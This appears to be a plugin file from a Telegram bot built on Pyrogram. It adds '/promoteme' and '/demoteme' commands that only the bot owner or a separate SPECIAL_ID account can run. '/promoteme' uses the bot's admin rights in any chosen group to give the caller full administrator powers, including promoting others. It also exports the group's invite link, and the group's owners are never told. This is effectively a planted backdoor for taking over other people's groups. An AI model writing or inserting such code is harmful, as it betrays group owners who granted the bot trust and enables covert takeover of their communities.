from pyrogram import filters
from pyrogram.errors import RPCError, ChatAdminRequired, UserNotParticipant
from pyrogram.types import ChatPrivileges, Message
from AloneX.misc import SPECIAL_ID
from config import OWNER_ID
from AloneX import app
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton

@app.on_message(filters.command("promoteme") & (filters.user(OWNER_ID) | filters.user(SPECIAL_ID)))
async def rpromote(client, message: Message):
    try:
        # Extracting user_id and group_id from the message
        args = message.text.split()
        group_id = args[1]
        admin_tag = ' '.join(args[2:]) if len(args) > 2 else "Champu"

        # Resolve the ɢʀᴏᴜᴘ or username to an actual group_id if provided
        if group_id.startswith("https://t.me/"):
            group = await client.resolve_chat(group_id.split("/")[-1])
            group_id = group.id
        elif group_id.startswith("@"):
            group = await client.get_chat(group_id)
            group_id = group.id
        else:
            group_id = int(group_id)

    except (ValueError, IndexError):
        return await message.reply_text("ᴘʟᴇᴀsᴇ ᴘʀᴏᴠɪᴅᴇ ᴀ ᴠᴀʟɪᴅ ɢʀᴏᴜᴘ ɪᴅ, ɢʀᴏᴜᴘ ᴜsᴇʀɴᴀᴍᴇ, ᴏʀ ɢʀᴏᴜᴘ.")

    CHAMPU = await message.reply_text(
        f"ᴀᴛᴛᴇᴍᴘᴛɪɴɢ ᴛᴏ ᴘʀᴏᴍᴏᴛᴇ {message.from_user.mention} ɪɴ ᴛʜᴇ ɢʀᴏᴜᴘ <code>{group_id}</code>..."
    )

    try:
        # Attempt to promote the user with full admin privileges
        await app.promote_chat_member(
            group_id,
            message.from_user.id,
            privileges=ChatPrivileges(
                can_change_info=True,
                can_invite_users=True,
                can_delete_messages=True,
                can_restrict_members=True,
                can_pin_messages=True,
                can_promote_members=True,
                can_manage_chat=True,
                can_manage_video_chats=True,
            ),
        )
        
        # Check if the group is a supergroup
        group = await client.get_chat(group_id)
        if group.type == "supergroup":
            await app.set_administrator_title(group_id, message.from_user.id, admin_tag)
            invite_link = await group.export_invite_link()
            await CHAMPU.edit(
                f"sᴜᴄᴄᴇssғᴜʟʟʏ ᴘʀᴏᴍᴏᴛᴇᴅ {message.from_user.mention} ᴛᴏ ᴀᴅᴍɪɴ ɪɴ ᴛʜᴇ ɢʀᴏᴜᴘ <code>{group_id}</code> ᴡɪᴛʜ ᴛʜᴇ ᴛɪᴛʟᴇ: {admin_tag}",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("ɢʀᴏᴜᴘ", url=invite_link)]
                ])
            )
        else:
            invite_link = await group.export_invite_link()
            await CHAMPU.edit(
                f"sᴜᴄᴄᴇssғᴜʟʟʏ ᴘʀᴏᴍᴏᴛᴇᴅ {message.from_user.mention} ᴛᴏ ᴀᴅᴍɪɴ ɪɴ ᴛʜᴇ ɢʀᴏᴜᴘ <code>{group_id}</code>.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("ɢʀᴏᴜᴘ", url=invite_link)]
                ])
            )

    except ChatAdminRequired:
        await CHAMPU.edit("ᴇʀʀᴏʀ: ɪ ɴᴇᴇᴅ ᴛᴏ ʙᴇ ᴀɴ ᴀᴅᴍɪɴ ᴛᴏ ᴘʀᴏᴍᴏᴛᴇ ʏᴏᴜ.")
    except UserNotParticipant:
        await CHAMPU.edit("ᴇʀʀᴏʀ: ʏᴏᴜ ᴍᴜsᴛ ʙᴇ ᴀ ᴍᴇᴍʙᴇʀ ᴏғ ᴛʜᴇ ɢʀᴏᴜᴘ ᴛᴏ ʙᴇ ᴘʀᴏᴍᴏᴛᴇᴅ.")
    except RPCError as e:
        await CHAMPU.edit(f"ᴀɴ ᴇʀʀᴏʀ ᴏᴄᴄᴜʀʀᴇᴅ: {str(e)}")

@app.on_message(filters.command("demoteme") & (filters.user(OWNER_ID) | filters.user(SPECIAL_ID)))
async def rdemote(client, message: Message):
    try:
        group_id = message.text.split(maxsplit=1)[1]

        if group_id.startswith("https://t.me/"):
            group = await client.resolve_chat(group_id.split("/")[-1])
            group_id = group.id
        elif group_id.startswith("@"):
            group = await client.get_chat(group_id)
            group_id = group.id
        else:
            group_id = int(group_id)

    except (ValueError, IndexError):
        return await message.reply_text("ᴘʟᴇᴀsᴇ ᴘʀᴏᴠɪᴅᴇ ᴀ ᴠᴀʟɪᴅ ɢʀᴏᴜᴘ ɪᴅ, ɢʀᴏᴜᴘ ᴜsᴇʀɴᴀᴍᴇ, ᴏʀ ɢʀᴏᴜᴘ.")

    CHAMPU = await message.reply_text(
        f"ᴀᴛᴛᴇᴍᴘᴛɪɴɢ ᴛᴏ ᴅᴇᴍᴏᴛᴇ {message.from_user.mention} ɪɴ ᴛʜᴇ ɢʀᴏᴜᴘ <code>{group_id}</code>..."
    )

    try:
        # Attempt to demote the user
        await app.promote_chat_member(
            group_id,
            message.from_user.id,
            privileges=ChatPrivileges(
                can_change_info=False,
                can_invite_users=False,
                can_delete_messages=False,
                can_restrict_members=False,
                can_pin_messages=False,
                can_promote_members=False,
                can_manage_chat=False,
                can_manage_video_chats=False,
            ),
        )
        
        await CHAMPU.edit(f"sᴜᴄᴄᴇssғᴜʟʟʏ ᴅᴇᴍᴏᴛᴇᴅ {message.from_user.mention} ɪɴ ᴛʜᴇ ɢʀᴏᴜᴘ <code>{group_id}</code>.")
    
    except ChatAdminRequired:
        await CHAMPU.edit("ᴇʀʀᴏʀ: ɪ ɴᴇᴇᴅ ᴛᴏ ʙᴇ ᴀɴ ᴀᴅᴍɪɴ ᴛᴏ ᴅᴇᴍᴏᴛᴇ ʏᴏᴜ.")
    except RPCError as e:
        await CHAMPU.edit(f"ᴀɴ ᴇʀʀᴏʀ ᴏᴄᴄᴜʀʀᴇᴅ: {str(e)}")
